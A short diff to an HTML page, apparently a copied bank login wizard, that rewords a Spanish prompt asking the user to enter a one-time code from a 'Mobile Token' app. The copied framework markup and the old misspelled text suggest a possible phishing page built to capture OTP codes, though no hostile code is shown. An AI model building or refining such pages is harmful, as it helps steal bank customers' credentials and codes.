@@ -1045,7 +1045,8 @@
 									<div style="     font-size: 15px !important; 
     width: 60% !important;
 }" _ngcontent-c29="" class="wizard-step-content-title">
-										<span _ngcontent-c29="" >Abre tu aplicacion movil y has clic en obtener codigo OTP he ingresalo para continuar</span>
+										<span _ngcontent-c29="" >Es hora de usar su dispositivo de seguridad Mobile Token</span>
+										<span _ngcontent-c37="" class="subotica-description-text">Ingrese el código que aparece en la app</span>
 									</div>  </center>
 									<icb-login-step-user _ngcontent-c29="" _nghost-c35=""><div  class="wizardAutoHeightModeX ng-pristine ng-invalid ng-touched">
     <div _ngcontent-c35="" class="subotica">
